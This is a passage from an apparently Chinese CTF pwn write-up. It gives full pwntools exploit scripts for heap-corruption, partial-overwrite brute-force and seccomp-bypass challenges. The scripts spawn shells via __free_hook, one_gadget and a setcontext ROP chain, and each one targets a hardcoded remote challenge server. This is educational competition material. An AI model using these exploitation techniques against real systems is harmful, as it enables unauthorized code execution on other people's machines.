</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--libc&#34;</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=s2>&#34;./libc-2.27.so&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--arch&#34;</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--remote&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>args</span> <span class=o>=</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=n>args</span><span class=o>.</span><span class=n>arch</span><span class=p>,</span><span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;debug&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>retrieve_name</span><span class=p>(</span><span class=n>var</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>callers_local_vars</span> <span class=o>=</span> <span class=n>inspect</span><span class=o>.</span><span class=n>currentframe</span><span class=p>()</span><span class=o>.</span><span class=n>f_back</span><span class=o>.</span><span class=n>f_back</span><span class=o>.</span><span class=n>f_locals</span><span class=o>.</span><span class=n>items</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>[</span><span class=n>var_name</span> <span class=k>for</span> <span class=n>var_name</span><span class=p>,</span> <span class=n>var_val</span> <span class=ow>in</span> <span class=n>callers_local_vars</span> <span class=k>if</span> <span class=n>var_val</span> <span class=ow>is</span> <span class=n>var</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>logvar</span><span class=p>(</span><span class=n>var</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>Fore</span><span class=o>.</span><span class=n>RED</span><span class=si>}{</span><span class=n>retrieve_name</span><span class=p>(</span><span class=n>var</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span><span class=si>}</span><span class=s1> : </span><span class=si>{</span><span class=n>var</span><span class=si>:</span><span class=s1>#x</span><span class=si>}{</span><span class=n>Style</span><span class=o>.</span><span class=n>RESET_ALL</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span>
</span></span><span class=line><span class=cl><span class=n>script</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rbt_bpt</span><span class=p>(</span><span class=n>offset</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>script</span>
</span></span><span class=line><span class=cl>    <span class=n>script</span> <span class=o>+=</span> <span class=sa>f</span><span class=s1>&#39;b * $rebase(</span><span class=si>{</span><span class=n>offset</span><span class=si>:</span><span class=s1>#x</span><span class=si>}</span><span class=s1>)</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>bpt</span><span class=p>(</span><span class=n>addr</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>script</span>
</span></span><span class=line><span class=cl>    <span class=n>script</span> <span class=o>+=</span> <span class=sa>f</span><span class=s1>&#39;b * </span><span class=si>{</span><span class=n>addr</span><span class=si>:</span><span class=s1>#x</span><span class=si>}</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dbg</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>sh</span><span class=p>,</span><span class=n>script</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=n>prompt</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;Queue Management: &#39;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>cmd</span><span class=p>(</span><span class=n>choice</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>prompt</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>choice</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cmd</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Size: &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>buf_id</span><span class=p>,</span><span class=n>idx</span><span class=p>,</span><span class=n>val</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cmd</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Index: &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>buf_id</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Value idx: &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Value: &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>val</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>buf_id</span><span class=p>,</span><span class=n>num</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cmd</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Index: &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>buf_id</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Num: &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>num</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dele</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>cmd</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>backdoor</span><span class=p>(</span><span class=n>buf_id</span><span class=p>,</span><span class=n>ctt</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cmd</span><span class=p>(</span><span class=mi>666</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Index: &#39;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>buf_id</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Content: &#39;</span><span class=p>,</span><span class=n>ctt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit_qword</span><span class=p>(</span><span class=n>buf_id</span><span class=p>,</span><span class=n>off</span><span class=p>,</span><span class=n>val</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>byte</span> <span class=o>=</span> <span class=n>val</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>        <span class=n>edit</span><span class=p>(</span><span class=n>buf_id</span><span class=p>,</span><span class=n>off</span><span class=o>+</span><span class=n>i</span><span class=p>,</span><span class=n>byte</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>val</span> <span class=o>&gt;&gt;=</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=n>rbt_bpt</span><span class=p>(</span><span class=mh>0x1688</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rbt_bpt</span><span class=p>(</span><span class=mh>0x16b5</span><span class=p>)</span> 
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>leak_num</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>val</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Content: &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>num</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span><span class=o>.</span><span class=n>strip</span><span class=p>(),</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>val</span> <span class=o>|=</span> <span class=n>num</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=mi>8</span><span class=o>*</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>val</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pwn</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>backdoor</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x88\x5e</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>heap_addr</span> <span class=o>=</span> <span class=n>leak_num</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>heap_addr</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>EOFError</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>5</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>add</span><span class=p>(</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>dele</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>backdoor</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_addr</span> <span class=o>+</span> <span class=mh>0x1a50</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>show</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mh>0x8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>leak_num</span><span class=p>()</span> <span class=o>-</span> <span class=mh>0x3ebca0</span>
</span></span><span class=line><span class=cl>    <span class=n>logvar</span><span class=p>(</span><span class=n>heap_addr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>logvar</span><span class=p>(</span><span class=n>libc_base</span><span class=p>)</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>    <span class=n>edit_qword</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>u64</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;/bin/sh</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>libc</span><span class=p>,</span><span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>libc</span><span class=o>.</span><span class=n>address</span> <span class=o>=</span> <span class=n>libc_base</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>([</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span><span class=o>+</span><span class=mh>0x200</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>heap_addr</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span><span class=o>+</span><span class=mh>0x200</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span><span class=o>+</span><span class=mh>0x200</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span><span class=o>+</span><span class=mh>0x200</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>heap_addr</span><span class=o>+</span><span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>backdoor</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>edit_qword</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=c1># dbg()</span>
</span></span><span class=line><span class=cl>    <span class=n>dele</span><span class=p>()</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># sh = process([args.elf])</span>
</span></span><span class=line><span class=cl>        <span class=n>sh</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;39.106.13.71&#39;</span> <span class=p>,</span><span class=s1>&#39;31586&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>pwn</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>sh</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>EOFError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sh</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=unexploitable>unexploitable</h2><p>利用思路：</p><p>因为程序仅仅有一个read函数，没有canary，而且溢出的字节非常大，所以本题可以随便溢，但问题是没有后门函数，并且没有输出函数。在开了PIE的情况下，很多花活是没法用的。</p><p>通过调试发现，在main函数返回到libc_start_main函数的时候，该地址是一个libc地址，而让执行流跳到一个地址就能get shell的地址只有one_gadget。通过用set命令更改内存的值为one_gadget，发现第一个one_gadget就能用(如下)
于是思路就是将libc start main的后三字节，改为one_gadget地址(由于libc地址后三位是固定的，所以我们需要爆破前三位，概率为1/4096)。</p><p>但如果我们单纯的填垃圾数据，然后溢出篡改的话，情况如下
<img src=/img/2022-xyb-SU-Writeup/6.png alt=img>
即使我们溢出篡改了libc_start_main,也会返回到它上面的地址，所以我们需要让执行流滑到libc_start_main上，开了PIE保护，我们无法直接获取ret指令的地址，但是vsyscall的地址始终是固定的，它可以当做ret指令来用。
所以我们把上图的0xdeadbeef改成vsyscall的地址即可，执行到vsyscall的时候就可以往下滑到爆破成功的one_gadget，从而获取shell。
EXP</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=c1>#context.log_level=&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>==</span> <span class=s2>&#34;debug&#34;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span> <span class=o>*</span> <span class=mi>3</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xffffffffff600000</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xa5\x22\x06</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>    <span class=c1>#debug(p)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;cat flag&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span><span class=o>=</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mf>0.5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>a</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;39.106.13.71&#34;</span><span class=p>,</span> <span class=mi>14305</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exp</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>EOFError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=sandboxheap>sandboxheap</h2><p>沙箱分析
<img src=/img/2022-xyb-SU-Writeup/7.png alt=img>
此处为0才不会进入if，否则就走ptrace禁用了。
初始化bss段这里全为1,当我们传进来的参数rdi为3的时候，则可以进入两个if(如下)，而switch case想进这里的话，需要让rax为0x2710,因此我们只要保证rop链执行的时候，先让rdi为3，rax为0x2710，然后调用syscall，自定义一个白名单，就可以去打orw了。
漏洞所在：
<img src=/img/2022-xyb-SU-Writeup/8.png alt=img>
在edit函数里，input函数(函数已重命名)的参数有个+1，所以判断这里是存在个溢出的。
然后input函数里面是这样的
说实话这个我没太看懂，不过根据调试和SU其他师傅的提示，感觉这里的大概意思就是说，我们输入的一个字节只取末尾一个比特，而八个字节就会取出来八个比特，这取出来的八个比特才表示出了一个字节。在以前我们想发送p64()打包后的数据，仅仅只需要发送八字节，但是在这题里，我们需要用64个字节来表示一个八字节的地址。
举个例子，我们原本要往内存里写一个地址为0xdeadbeef，以前的话，我们使用p64(0xdeadbeef)即可，但是这道题的话，我们使用下面的部分才能达到同样的效果
(bin(0xdeadbeef)[2:].rjust(64,&rsquo;\x00&rsquo;).encode()[::-1])</p><p>重新回到漏洞上面，这道题通过调试可以发现是溢出了一个比特，其实跟off by null的思路一样，都是去溢出然后篡改堆块的prev_inuse位，然后去打一个堆块合并。但是这道题还有一个难点就是有沙箱保护，通过分析沙箱规则，我们需要打一条rop链。因此对应的策略就是用setcontext来改变寄存器的值，从而将执行流劫持到rop链上</p><p>利用思路：
由于我们需要打堆块合并，所以需要让合并的堆块释放掉能够进入unsorted bin，因此第一件事是先填满tcache bin。接着去打堆块合并,脚本如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>11</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=mh>0x88</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>delete</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>    
</span></span><span class=line><span class=cl><span class=err>​</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>7</span><span class=p>)</span><span class=c1>#merge chunk   </span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;1&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x80</span><span class=o>*</span><span class=mi>8</span><span class=p>)</span><span class=o>+</span><span class=sa>b</span><span class=s1>&#39;00000100&#39;</span><span class=o>+</span><span class=sa>b</span><span class=s1>&#39;10000000&#39;</span><span class=o>+</span><span class=sa>b</span><span class=s1>&#39;00000000&#39;</span><span class=o>*</span><span class=mi>6</span><span class=o>+</span><span class=sa>b</span><span class=s1>&#39;00000000&#39;</span>
</span></span><span class=line><span class=cl><span class=err>​</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>debug</span><span class=p>(</span><span class=n>p</span><span class=p>,</span><span class=s1>&#39;pie&#39;</span><span class=p>,</span><span class=mh>0xED6</span><span class=p>,</span><span class=mh>0xEE2</span><span class=p>,</span><span class=mh>0xEEE</span><span class=p>,</span><span class=mh>0xEFA</span><span class=p>,</span><span class=mh>0xC9F</span><span class=p>,</span><span class=mh>0xBA7</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>9</span><span class=p>)</span><span class=c1>#堆块合并</span>
</span></span></code></pre></td></tr></table></div></div><p>接下来去泄露堆地址和libc地址，大致思路就是做堆块重叠，让一块被释放掉的内存落在一个正在使用的堆块中，从而执行show函数完成泄露libc和堆地址。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=mh>0x80</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=err>​</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>12</span><span class=p>,</span><span class=mh>0xc0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>12</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak_libc</span><span class=o>=</span><span class=n>recv_libc</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span><span class=o>=</span><span class=n>leak_libc</span><span class=o>-</span><span class=mh>0x3ebe40</span>
</span></span><span class=line><span class=cl><span class=n>log_addr</span><span class=p>(</span><span class=s1>&#39;libc_base&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free_hook</span><span class=o>=</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__free_hook&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>context_addr</span><span class=o>=</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;setcontext&#39;</span><span class=p>]</span><span class=o>+</span><span class=mi>53</span>
